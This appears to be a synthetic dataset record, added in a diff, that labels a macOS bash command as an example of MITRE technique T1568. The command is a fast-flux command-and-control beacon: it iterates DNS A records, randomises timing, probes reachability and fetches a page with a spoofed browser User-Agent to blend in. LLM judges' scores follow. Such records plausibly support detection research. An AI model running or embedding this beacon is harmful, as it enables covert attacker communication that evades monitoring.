@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "dom=\"static-assets-cache.net\"; ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; for ip in $(dig +short A \"$dom\"); do sleep $((RANDOM%4+1)); if nc -z -G 2 \"$ip\" 80 >/dev/null 2>&1; then wget -q --header=\"Host: $dom\" --user-agent=\"$ua\" --timeout=6 --tries=1 --header=\"Accept: text/html\" \"http://$ip/index.html\" -O - | grep -q \"</html>\" && break; fi; done",
+  "explanation": "Iterates across all resolved A records (fast-flux pool) with randomized delays and only contacts reachable IPs, using Host header and HTML path to resemble standard browsing.",
+  "rationale_steps": [
+    "Resolve current A records to build a fast-flux candidate set.",
+    "Randomize timing and validate TCP reachability before beaconing.",
+    "Fetch HTML content with realistic headers and break on success."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-cffb1c07",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and separators with valid bash constructs; dig, nc (-z -G), and wget flags are correctly formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It resolves A records at runtime and iterates through a fast-flux pool with randomized delays and Host header use, aligning with dynamic resolution behaviors, though it only uses a single DNS snapshot rather than periodic regeneration.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:37:37.601059Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid subshell expansion via $(dig +short A \"$dom\"), proper use of semicolons and &&, and all flags are valid for nc, wget, grep, and sleep on macOS bash.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 fast-flux C2 contact by iterating over all A records returned for a domain (simulating a fast-flux pool), using randomized delays to evade beaconing detection, checking reachability before connecting, and spoofing legitimate browser behavior via Host header and User-Agent to blend in with normal HTTP traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:25:00.862218Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed for bash, with correct variable assignments, loop structures, command substitutions, and properly escaped/quoted strings.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a fast-flux resolution pattern by iterating through multiple A records, using randomized delays, and employing host-header spoofing to contact a rotating set of endpoints.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:25:04.598475Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
